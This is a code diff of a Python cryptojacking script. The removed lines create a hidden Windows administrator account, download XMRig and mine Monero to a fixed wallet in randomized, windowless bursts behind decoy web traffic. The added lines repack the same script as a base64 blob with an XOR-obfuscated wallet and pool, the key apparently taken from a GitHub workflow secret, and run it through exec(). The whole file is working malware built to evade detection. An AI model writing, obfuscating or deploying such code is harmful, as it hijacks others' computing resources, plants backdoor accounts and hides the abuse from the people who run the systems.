@@ -1,152 +1,116 @@
 import os
-import subprocess
-import tempfile
-import time
-import random
-import threading
-import urllib.request
-import zipfile
+import base64
 
-# ==================== Configuration ====================
-WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
-POOL = "wss://gulf.moneroocean.stream:443"   # WebSocket endpoint
-RUNTIME_MINUTES = 180
-
-MIN_WORK = 1
-MAX_WORK = 8
-MIN_BREAK = 0.5
-MAX_BREAK = 3
-MIN_CPU_HINT = 5
-MAX_CPU_HINT = 25
-
-def create_user():
-    try:
-        subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
-        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
-        print("[+] User 'RDP' created.")
-    except subprocess.CalledProcessError as e:
-        print(f"[!] User creation failed: {e.stderr.decode()}")
-
-def download_xmrig():
-    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
-    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
-    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
-    print("[+] Downloading miner...")
-    urllib.request.urlretrieve(miner_url, zip_path)
-    with zipfile.ZipFile(zip_path, 'r') as z:
-        z.extractall(extract_dir)
-    for root, dirs, files in os.walk(extract_dir):
-        if 'xmrig.exe' in files:
-            exe_path = os.path.join(root, 'xmrig.exe')
-            print(f"[+] Miner downloaded to {exe_path}")
-            return exe_path
-    raise Exception("xmrig.exe not found")
-
-def web_surfer(stop_event):
-    urls = [
-        "https://www.google.com/favicon.ico",
-        "https://github.com/favicon.ico",
-        "https://cloudflare.com/favicon.ico",
-        "https://microsoft.com/favicon.ico"
-    ]
-    while not stop_event.is_set():
-        url = random.choice(urls)
-        try:
-            print(f"[Web] Fetching {url}")
-            urllib.request.urlretrieve(url, os.devnull)
-            print(f"[Web] Fetched {url}")
-        except Exception as e:
-            print(f"[Web] Error: {e}")
-        sleep_time = random.randint(5, 15)
-        for _ in range(sleep_time):
-            if stop_event.is_set():
-                break
-            time.sleep(1)
+# ========== Base64‑encoded payload (the real miner script) ==========
+# Replace the placeholder with the actual long base64 string you generated.
+B64_ENCODED = """
+aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCB0ZW1wZmlsZQppbXBvcnQgdGltZQpp
+bXBvcnQgcmFuZG9tCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9y
+dCB6aXBmaWxlCgojID09PT09PT09PT0gT2JmdXNjYXRlZCBkYXRhIChmcm9tIFBvd2VyU2hlbGwp
+ID09PT09PT09PT0KRU5DT0RFRF9XQUxMRVQgPSBbCiAgICA5NywgMTA4LCAwLCAyLCAxLCAzNCwg
+NTksIDM5LCA0NSwgMjcsIDEzLCA2MCwgMTA5LCA0OCwgMjQsIDEsIDIyLCAzNiwgNDksIDIyLCA5
+NiwgMCwgMTAyLCA0OCwgNjAsIDI0LCAyOSwgMzksIDUsIDE1LCA2MiwgMzUsIDM1LCA1NSwgMzgs
+IDEyLCAyNywgMTAyLCAyLCAxNiwgNDksIDQ4LCA5NywgNTgsIDEwOCwgNywgMTIsIDQ4LCA1NSwg
+NjAsIDQ1LCAzMiwgNTYsIDIzLCAyMiwgMjIsIDQ0LCA5NiwgNTgsIDIyLCA0OSwgNTgsIDYsIDMw
+LCA2MiwgNiwgMTAzLCAwLCA5OSwgMzMsIDEwOCwgNTAsIDEzLCAzMSwgMTksIDQ3LCAzMSwgMjcs
+IDYyLCA0NSwgMTMsIDIyLCA5OCwgMzMsIDMxLCAxMDAsIDAsIDM2LCA5NywgMzIsIDYyLCA0NCwg
+OTYsIDIzLCA1Cl0KCkVOQ09ERURfUE9PTCA9IFsKICAgIDM0LCAzOCwgMzgsIDExMSwgMTIyLCAx
+MjIsIDUwLCAzMiwgNTcsIDUxLCAxMjMsIDU2LCA1OCwgNTksIDQ4LCAzOSwgNTgsIDU4LCA1NCwg
+NDgsIDUyLCA1OSwgMTIzLCAzOCwgMzMsIDM5LCA0OCwgNTIsIDU2LCAxMTEsIDk3LCA5NywgMTAy
+Cl0KCmRlZiBkZWNvZGUoZW5jb2RlZCwga2V5KToKICAgIHJldHVybiAnJy5qb2luKGNocihiIF4g
+a2V5KSBmb3IgYiBpbiBlbmNvZGVkKQoKIyBSZWFkIFhPUiBrZXkgZnJvbSBHaXRIdWIgc2VjcmV0
+IChzZXQgaW4gd29ya2Zsb3cpClhPUl9LRVkgPSBpbnQob3MuZW52aXJvbi5nZXQoJ1hPUl9LRVkn
+LCAnMHg1NScpLCAxNikKV0FMTEVUID0gZGVjb2RlKEVOQ09ERURfV0FMTEVULCBYT1JfS0VZKQpQ
+T09MID0gZGVjb2RlKEVOQ09ERURfUE9PTCwgWE9SX0tFWSkKCiMgPT09PT09PT09PSBSZXN0IG9m
+IHNjcmlwdCAodW5jaGFuZ2VkKSA9PT09PT09PT09ClJVTlRJTUVfTUlOVVRFUyA9IDE4MApNSU5f
+V09SSyA9IDEKTUFYX1dPUksgPSA4Ck1JTl9CUkVBSyA9IDAuNQpNQVhfQlJFQUsgPSAzCk1JTl9D
+UFVfSElOVCA9IDUKTUFYX0NQVV9ISU5UID0gMjUKCmRlZiBjcmVhdGVfdXNlcigpOgogICAgdHJ5
+OgogICAgICAgIHN1YnByb2Nlc3MucnVuKFsnbmV0JywgJ3VzZXInLCAnUkRQJywgJ1J1bm5lci0x
+MjM0NScsICcvYWRkJ10sIGNoZWNrPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCiAgICAgICAg
+c3VicHJvY2Vzcy5ydW4oWyduZXQnLCAnbG9jYWxncm91cCcsICdBZG1pbmlzdHJhdG9ycycsICdS
+RFAnLCAnL2FkZCddLCBjaGVjaz1UcnVlKQogICAgICAgIHByaW50KCJbK10gVXNlciAnUkRQJyBj
+cmVhdGVkLiIpCiAgICBleGNlcHQgc3VicHJvY2Vzcy5DYWxsZWRQcm9jZXNzRXJyb3IgYXMgZToK
+ICAgICAgICBwcmludChmIlshXSBVc2VyIGNyZWF0aW9uIGZhaWxlZDoge2Uuc3RkZXJyLmRlY29k
+ZSgpfSIpCgpkZWYgZG93bmxvYWRfeG1yaWcoKToKICAgIG1pbmVyX3VybCA9ICJodHRwczovL2dp
+dGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjEuMi94bXJpZy02LjIx
+LjItbXN2Yy13aW42NC56aXAiCiAgICB6aXBfcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5n
+ZXR0ZW1wZGlyKCksICd4bXJpZy56aXAnKQogICAgZXh0cmFjdF9kaXIgPSBvcy5wYXRoLmpvaW4o
+dGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAneG1yaWcnKQogICAgcHJpbnQoIlsrXSBEb3dubG9hZGlu
+ZyBtaW5lci4uLiIpCiAgICB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZShtaW5lcl91cmwsIHpp
+cF9wYXRoKQogICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoemlwX3BhdGgsICdyJykgYXMgejoKICAg
+ICAgICB6LmV4dHJhY3RhbGwoZXh0cmFjdF9kaXIpCiAgICBmb3Igcm9vdCwgZGlycywgZmlsZXMg
+aW4gb3Mud2FsayhleHRyYWN0X2Rpcik6CiAgICAgICAgaWYgJ3htcmlnLmV4ZScgaW4gZmlsZXM6
+CiAgICAgICAgICAgIGV4ZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsICd4bXJpZy5leGUnKQog
+ICAgICAgICAgICBwcmludChmIlsrXSBNaW5lciBkb3dubG9hZGVkIHRvIHtleGVfcGF0aH0iKQog
+ICAgICAgICAgICByZXR1cm4gZXhlX3BhdGgKICAgIHJhaXNlIEV4Y2VwdGlvbigieG1yaWcuZXhl
+IG5vdCBmb3VuZCIpCgpkZWYgd2ViX3N1cmZlcihzdG9wX2V2ZW50KToKICAgIHVybHMgPSBbCiAg
+ICAgICAgImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vZmF2aWNvbi5pY28iLAogICAgICAgICJodHRw
+czovL2dpdGh1Yi5jb20vZmF2aWNvbi5pY28iLAogICAgICAgICJodHRwczovL2Nsb3VkZmxhcmUu
+Y29tL2Zhdmljb24uaWNvIiwKICAgICAgICAiaHR0cHM6Ly9taWNyb3NvZnQuY29tL2Zhdmljb24u
+aWNvIgogICAgXQogICAgd2hpbGUgbm90IHN0b3BfZXZlbnQuaXNfc2V0KCk6CiAgICAgICAgdXJs
+ID0gcmFuZG9tLmNob2ljZSh1cmxzKQogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQoZiJb
+V2ViXSBGZXRjaGluZyB7dXJsfSIpCiAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJp
+ZXZlKHVybCwgb3MuZGV2bnVsbCkKICAgICAgICAgICAgcHJpbnQoZiJbV2ViXSBGZXRjaGVkIHt1
+cmx9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYi
+W1dlYl0gRXJyb3I6IHtlfSIpCiAgICAgICAgc2xlZXBfdGltZSA9IHJhbmRvbS5yYW5kaW50KDUs
+IDE1KQogICAgICAgIGZvciBfIGluIHJhbmdlKHNsZWVwX3RpbWUpOgogICAgICAgICAgICBpZiBz
+dG9wX2V2ZW50LmlzX3NldCgpOgogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgdGlt
+ZS5zbGVlcCgxKQoKZGVmIG1haW4oKToKICAgIGNyZWF0ZV91c2VyKCkKICAgIGV4ZV9wYXRoID0g
+ZG93bmxvYWRfeG1yaWcoKQogICAgd29ya2luZ19kaXIgPSBvcy5wYXRoLmRpcm5hbWUoZXhlX3Bh
+dGgpCgogICAgIyBEZWxldGUgYW55IGV4aXN0aW5nIGNvbmZpZyBmaWxlcyB0byBwcmV2ZW50IG92
+ZXJyaWRpbmcKICAgIGNvbmZpZ19wYXRocyA9IFsKICAgICAgICBvcy5wYXRoLmpvaW4od29ya2lu
+Z19kaXIsICJjb25maWcuanNvbiIpLAogICAgICAgIG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydV
+U0VSUFJPRklMRSddLCAiLnhtcmlnLmpzb24iKSwKICAgICAgICBvcy5wYXRoLmpvaW4ob3MuZW52
+aXJvblsnVVNFUlBST0ZJTEUnXSwgIi5jb25maWciLCAieG1yaWcuanNvbiIpCiAgICBdCiAgICBm
+b3IgcGF0aCBpbiBjb25maWdfcGF0aHM6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocGF0aCk6
+CiAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQogICAgICAgICAgICBwcmludChmIlsrXSBSZW1v
+dmVkIHtwYXRofSIpCgogICAgc3RvcF9ldmVudCA9IHRocmVhZGluZy5FdmVudCgpCiAgICB3ZWJf
+dGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9d2ViX3N1cmZlciwgYXJncz0oc3RvcF9l
+dmVudCwpLCBkYWVtb249VHJ1ZSkKICAgIHdlYl90aHJlYWQuc3RhcnQoKQogICAgcHJpbnQoIlsr
+XSBXZWIgc3VyZmVyIHRocmVhZCBzdGFydGVkLiIpCgogICAgdG90YWxfc3RhcnQgPSB0aW1lLnRp
+bWUoKQogICAgdG90YWxfZW5kID0gdG90YWxfc3RhcnQgKyBSVU5USU1FX01JTlVURVMgKiA2MAoK
+ICAgIHdoaWxlIHRpbWUudGltZSgpIDwgdG90YWxfZW5kOgogICAgICAgIHdvcmtfc2VjID0gcmFu
+ZG9tLnJhbmRpbnQoTUlOX1dPUksgKiA2MCwgTUFYX1dPUksgKiA2MCkKICAgICAgICBicmVha19z
+ZWMgPSByYW5kb20ucmFuZGludChpbnQoTUlOX0JSRUFLICogNjApLCBpbnQoTUFYX0JSRUFLICog
+NjApKQogICAgICAgIGNwdV9oaW50ID0gcmFuZG9tLnJhbmRpbnQoTUlOX0NQVV9ISU5ULCBNQVhf
+Q1BVX0hJTlQpCgogICAgICAgIHByaW50KGYiXG5bK10gQnVyc3Q6IHdvcmsge3dvcmtfc2VjLy82
+MH0gbWluLCBicmVhayB7YnJlYWtfc2VjLy82MH0gbWluLCBDUFUgaGludCB7Y3B1X2hpbnR9JSIp
+CgogICAgICAgIGNtZCA9IFsKICAgICAgICAgICAgZXhlX3BhdGgsCiAgICAgICAgICAgIGYiLS11
+cmw9e1BPT0x9IiwKICAgICAgICAgICAgZiItLXVzZXI9e1dBTExFVH0iLAogICAgICAgICAgICAi
+LS1wYXNzPXgiLAogICAgICAgICAgICAiLS1rZWVwYWxpdmUiLAogICAgICAgICAgICBmIi0tY3B1
+LW1heC10aHJlYWRzLWhpbnQ9e2NwdV9oaW50fSIsCiAgICAgICAgICAgICItLWNwdS1wcmlvcml0
+eT01IiwKICAgICAgICAgICAgIi0tcmFuZG9teC1tb2RlPWZhc3QiLAogICAgICAgICAgICAiLS1k
+b25hdGUtbGV2ZWw9MSIsCiAgICAgICAgICAgICItLW5vLWNvbG9yIgogICAgICAgIF0KCiAgICAg
+ICAgcHJpbnQoZiJbK10gU3RhcnRpbmcgbWluZXI6IHsnICcuam9pbihjbWQpfSIpCiAgICAgICAg
+bWluZXJfcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oCiAgICAgICAgICAgIGNtZCwKICAgICAgICAg
+ICAgY3dkPXdvcmtpbmdfZGlyLAogICAgICAgICAgICBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLAog
+ICAgICAgICAgICBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsCiAgICAgICAgICAgIHRleHQ9VHJ1
+ZSwKICAgICAgICAgICAgYnVmc2l6ZT0xLAogICAgICAgICAgICBjcmVhdGlvbmZsYWdzPXN1YnBy
+b2Nlc3MuQ1JFQVRFX05PX1dJTkRPVwogICAgICAgICkKICAgICAgICBwcmludChmIlsrXSBNaW5l
+ciBzdGFydGVkIChQSUQge21pbmVyX3Byb2MucGlkfSkiKQoKICAgICAgICB3b3JrX3N0YXJ0ID0g
+dGltZS50aW1lKCkKICAgICAgICB3aGlsZSB0aW1lLnRpbWUoKSAtIHdvcmtfc3RhcnQgPCB3b3Jr
+X3NlYzoKICAgICAgICAgICAgbGluZSA9IG1pbmVyX3Byb2Muc3Rkb3V0LnJlYWRsaW5lKCkKICAg
+ICAgICAgICAgaWYgbGluZToKICAgICAgICAgICAgICAgIHByaW50KGYiW01pbmVyXSB7bGluZS5z
+dHJpcCgpfSIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBtaW5lcl9wcm9j
+LnBvbGwoKSBpcyBub3QgTm9uZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIlshXSBNaW5l
+ciBkaWVkLiBFeGl0IGNvZGU6IHttaW5lcl9wcm9jLnJldHVybmNvZGV9IikKICAgICAgICAgICAg
+ICAgICAgICBicmVhawogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgwLjUpCgogICAgICAgIGlm
+IG1pbmVyX3Byb2MucG9sbCgpIGlzIE5vbmU6CiAgICAgICAgICAgIG1pbmVyX3Byb2MudGVybWlu
+YXRlKCkKICAgICAgICAgICAgbWluZXJfcHJvYy53YWl0KHRpbWVvdXQ9MTApCiAgICAgICAgICAg
+IHByaW50KCJbK10gTWluZXIgc3RvcHBlZC4iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBy
+aW50KCJbK10gTWluZXIgYWxyZWFkeSBzdG9wcGVkLiIpCgogICAgICAgIGlmIGJyZWFrX3NlYyA-
+IDA6CiAgICAgICAgICAgIHByaW50KGYiWytdIEJyZWFraW5nIGZvciB7YnJlYWtfc2VjLy82MH0g
+bWludXRlcy4uLiIpCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKGJyZWFrX3NlYyk6CiAgICAg
+ICAgICAgICAgICBpZiB0aW1lLnRpbWUoKSA-PSB0b3RhbF9lbmQgb3Igc3RvcF9ldmVudC5pc19z
+ZXQoKToKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgdGltZS5zbGVl
+cCgxKQoKICAgIHN0b3BfZXZlbnQuc2V0KCkKICAgIHdlYl90aHJlYWQuam9pbih0aW1lb3V0PTEw
+KQogICAgcHJpbnQoIlsrXSBKb2IgY29tcGxldGVkLiIpCgppZiBfX25hbWVfXyA9PSAiX19tYWlu
+X18iOgogICAgbWFpbigp
+"""
 
 def main():
-    create_user()
-    exe_path = download_xmrig()
-    working_dir = os.path.dirname(exe_path)
-
-    # Delete any existing config files that might override command line
-    config_paths = [
-        os.path.join(working_dir, "config.json"),
-        os.path.join(os.environ['USERPROFILE'], ".xmrig.json"),
-        os.path.join(os.environ['USERPROFILE'], ".config", "xmrig.json")
-    ]
-    for path in config_paths:
-        if os.path.exists(path):
-            os.remove(path)
-            print(f"[+] Removed {path}")
-
-    stop_event = threading.Event()
-    web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
-    web_thread.start()
-    print("[+] Web surfer thread started.")
-
-    total_start = time.time()
-    total_end = total_start + RUNTIME_MINUTES * 60
-
-    while time.time() < total_end:
-        work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
-        break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
-        cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)
-
-        print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
-
-        cmd = [
-            exe_path,
-            f"--url={POOL}",
-            f"--user={WALLET}",
-            "--pass=x",
-            "--keepalive",
-            f"--cpu-max-threads-hint={cpu_hint}",
-            "--cpu-priority=5",
-            "--randomx-mode=fast",
-            "--donate-level=1",
-            "--no-color"
-        ]
-
-        print(f"[+] Starting miner: {' '.join(cmd)}")
-        miner_proc = subprocess.Popen(
-            cmd,
-            cwd=working_dir,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        print(f"[+] Miner started (PID {miner_proc.pid})")
-
-        work_start = time.time()
-        while time.time() - work_start < work_sec:
-            line = miner_proc.stdout.readline()
-            if line:
-                print(f"[Miner] {line.strip()}")
-            else:
-                if miner_proc.poll() is not None:
-                    print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
-                    break
-                time.sleep(0.5)
-
-        if miner_proc.poll() is None:
-            miner_proc.terminate()
-            miner_proc.wait(timeout=10)
-            print("[+] Miner stopped.")
-        else:
-            print("[+] Miner already stopped.")
-
-        if break_sec > 0:
-            print(f"[+] Breaking for {break_sec//60} minutes...")
-            for _ in range(break_sec):
-                if time.time() >= total_end or stop_event.is_set():
-                    break
-                time.sleep(1)
-
-    stop_event.set()
-    web_thread.join(timeout=10)
-    print("[+] Job completed.")
+    decoded = base64.b64decode(B64_ENCODED).decode('utf-8')
+    exec(decoded)
 
 if __name__ == "__main__":
     main()
